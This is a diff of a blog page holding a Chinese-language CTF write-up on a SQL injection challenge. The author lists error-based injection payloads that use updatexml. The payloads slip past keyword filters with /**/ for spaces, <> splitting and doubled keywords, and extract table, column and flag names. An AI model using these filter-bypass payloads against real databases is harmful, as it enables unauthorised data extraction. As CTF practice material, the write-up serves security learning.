@@ -230,6 +230,8 @@
                     
                       <a class="main-nav-link switch-friends-link" href="http://skysec.top/">一叶飘零</a>
                     
+                      <a class="main-nav-link switch-friends-link" href="/www.yytpublic.cn">LaurenceYu</a>
+                    
                     </div>
                 </section>
                 
@@ -334,7 +336,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>又发现一个很好的平台尝试做一下<br><a id="more"></a></p>
+        
+<p>又发现一个很好的平台尝试做一下<br><a id="more"></a></p>
 <h2 id="真的注入"><a href="#真的注入" class="headerlink" title="真的注入"></a>真的注入</h2><p>先输入’发现有报错，应该存在注入<br>然后尝试<br><code>1&#39; or &#39;1&#39;=&#39;1</code>发现被过滤了<br><!--more--><br>然后继续尝试发现<code>空格，union，or,and</code>被过滤了，当然这里也可以用bp的爆破功能去测试，还是很好用的<br>然后这题还有一个坑就是xss的提示，输入<code>&lt;&gt;</code>发现被过滤，这样我们就能够利用这一点去构造payload<br>而空格我们可以用<code>/**/</code>来绕过<br>下面是我的注入过程</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/o&lt;&gt;r/**/1=1#</span><br><span class="line">1&apos;/**/o&lt;&gt;rder/**/by/**/3#</span><br><span class="line">-1&apos;/**/un&lt;&gt;ion/**/sel&lt;&gt;ect/**/1,2,3# 发现没有回显，只能尝试报错注入或者盲注了，但盲注写脚本太麻烦我们尝试报错注入</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/database())),1)# 发现数据库，下面就是常规操作了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/table_name/**/from/**/info&lt;&gt;rmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),0x7e),1)#发现表名flag_0d9a，其实这里也可以用group_concat，没被过滤</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/coulmn_name/**/from/**/info&lt;&gt;rmation_schema.columns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#</span><br><span class="line">这里突然发现column被过滤掉了，只能双写绕过了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/colcolumnsumn_name/**/from/**/info&lt;&gt;rmation_schema.colcolumnsumns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#发现列名flag</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/flag/**/from/**/flag_0d9a),0x7e),1)# 得到flag</span><br></pre></td></tr></table></figure>
 <p>这一题又再一次复习了用&lt;&gt;还有双写绕过的技巧</p>
